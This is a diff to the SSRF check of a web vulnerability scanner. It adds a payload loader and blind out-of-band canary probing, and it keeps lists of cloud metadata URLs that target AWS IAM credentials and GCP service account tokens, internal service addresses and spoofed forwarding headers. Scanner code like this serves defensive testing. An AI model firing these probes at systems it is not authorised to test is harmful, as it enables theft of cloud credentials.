@@ -3,13 +3,13 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from typing import List
 from scanner.core.scan_result import Finding, Severity
 from scanner.core.crawler import CrawlResult
+from scanner.utils.payloads import load_payloads
 
-# Replace with your own interactsh or Burp Collaborator host for blind SSRF detection
-CANARY_HOST = "kagesec-canary.yourdomain.com"
+_DEFAULT_CANARY = "kagesec-canary.invalid"
 
-URL_PARAMS = {"url", "redirect", "next", "src", "href", "image", "uri", "path", "dest", "target", "fetch", "load", "file", "link", "proxy"}
+_HARDCODED_URL_PARAMS = {"url", "redirect", "next", "src", "href", "image", "uri", "path", "dest", "target", "fetch", "load", "file", "link", "proxy"}
 
-CLOUD_PAYLOADS = [
+_HARDCODED_CLOUD = [
     ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "instance-type"], "AWS IMDS v1"),
     ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"], "AWS IAM credentials"),
     ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "vmId", "subscriptionId"], "Azure IMDS"),
@@ -17,7 +17,7 @@ CLOUD_PAYLOADS = [
     ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ["access_token", "token_type"], "GCP service account token"),
 ]
 
-INTERNAL_PAYLOADS = [
+_HARDCODED_INTERNAL = [
     ("http://127.0.0.1/", None, "localhost"),
     ("http://localhost/", None, "localhost"),
     ("http://0.0.0.0/", None, "all-interfaces"),
@@ -27,10 +27,26 @@ INTERNAL_PAYLOADS = [
     ("http://127.0.0.1:27017/", ["mongod", "MongoDB"], "MongoDB"),
 ]
 
+def _load_ssrf_data():
+    data = load_payloads("ssrf")
+    if not data:
+        return _HARDCODED_CLOUD, _HARDCODED_INTERNAL, _HARDCODED_URL_PARAMS
+    try:
+        cloud = [(p["url"], p.get("signatures"), p["label"]) for p in data.get("cloud_payloads", [])]
+        internal = [(p["url"], p.get("signatures"), p["label"]) for p in data.get("internal_payloads", [])]
+        params = set(data.get("ssrf_params", []))
+        return (cloud or _HARDCODED_CLOUD,
+                internal or _HARDCODED_INTERNAL,
+                params or _HARDCODED_URL_PARAMS)
+    except (KeyError, TypeError):
+        return _HARDCODED_CLOUD, _HARDCODED_INTERNAL, _HARDCODED_URL_PARAMS
+
+CLOUD_PAYLOADS, INTERNAL_PAYLOADS, URL_PARAMS = _load_ssrf_data()
+
 SSRF_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Client-IP", "True-Client-IP"]
 
 
-def test(page: CrawlResult, client: httpx.Client) -> List[Finding]:
+def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
     findings = []
     parsed = urlparse(page.url)
     params = parse_qs(parsed.query)
@@ -49,6 +65,26 @@ def test(page: CrawlResult, client: httpx.Client) -> List[Finding]:
 
     # Header-based SSRF (probe with internal IPs in common forwarding headers)
     _test_header_ssrf(page.url, client, findings)
+
+    # Blind SSRF via OOB canary (DNS/HTTP callback)
+    if oob:
+        canary = oob.get_canary()
+        canary_payloads = [
+            f"http://{canary}/ssrf",
+            f"https://{canary}/ssrf",
+            f"//{canary}/ssrf",
+        ]
+        for param_name in list(params.keys()):
+            if param_name.lower() not in URL_PARAMS:
+                continue
+            for canary_payload in canary_payloads:
+                new_params = dict(params)
+                new_params[param_name] = [canary_payload]
+                test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
+                try:
+                    client.get(test_url, timeout=5)
+                except Exception:
+                    pass
 
     return findings
 
